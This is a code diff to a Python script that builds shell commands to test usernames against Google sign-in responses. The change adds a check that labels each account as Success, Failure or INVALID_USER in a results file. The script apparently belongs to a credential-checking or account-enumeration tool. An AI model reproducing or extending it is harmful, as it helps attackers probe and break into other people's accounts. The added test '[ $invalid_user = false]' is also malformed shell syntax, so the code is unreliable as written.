@@ -135,6 +135,15 @@ for user in usernames:
     commands.append("else")
     commands.append("show_pass=true")
     commands.append("fi")
+ 
+    # Check whether the user does not exist.
+    commands.append(f"result=`cat {output_dir}/{name}.txt | grep -i 'signed in to Google products like YouTube, try again with that email' | wc -c`")
+    commands.append("if [ $result -eq 0 ]")
+    commands.append("then")
+    commands.append("invalid_user=false")
+    commands.append("else")
+    commands.append("invalid_user=true")
+    commands.append("fi")
     
     # Determine whether the login was successful.
     commands.append("if [ $show_pass = true ] || [ $incorrect_pass = true ]")
@@ -146,9 +155,14 @@ for user in usernames:
     
     commands.append("if [ $success = true ]")
     commands.append("then")
+    commands.append("if [ $invalid_user = false]")
+    commands.append("then")
     commands.append(f"echo \"{user} Success\" >> {output_dir}/results.txt")
     commands.append(f"cat {output_dir}/results.txt")
     commands.append("exit")
+    commands.append("else")
+    commands.append(f"echo \"{user} INVALID_USER\" >> {output_dir}/results.txt")
+    commands.append("fi")    
     commands.append("else")
     commands.append(f"echo \"{user} Failure\" >> {output_dir}/results.txt")
     commands.append("fi")
